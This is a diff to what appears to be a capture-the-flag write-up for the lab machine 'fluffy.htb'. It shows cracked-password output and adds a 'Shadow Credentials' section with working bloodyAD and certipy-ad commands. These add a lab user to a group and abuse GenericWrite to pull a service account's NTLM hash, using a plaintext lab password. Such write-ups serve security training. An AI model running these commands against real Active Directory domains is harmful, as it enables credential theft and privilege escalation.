@@ -24,3 +24,20 @@ lovinlife!       (?)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
+
+---
+## 2. Method: Shadow Credentials
+
+It is often more saver to utilize shadow creds instead of changing the password to avoid lockout or being to loud. 
+
+Adding current user to the group using "BloodyAD".
+
+```
+bloodyad -u p.agila -p prometheusx-303 -d fluffy.htb -H 10.129.19.236 add groupmember 'service accounts' p.agila
+```
+
+Abusing GenericWrite to an service account and requesting NTLM Hash.
+
+```
+certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.129.19.236
+```
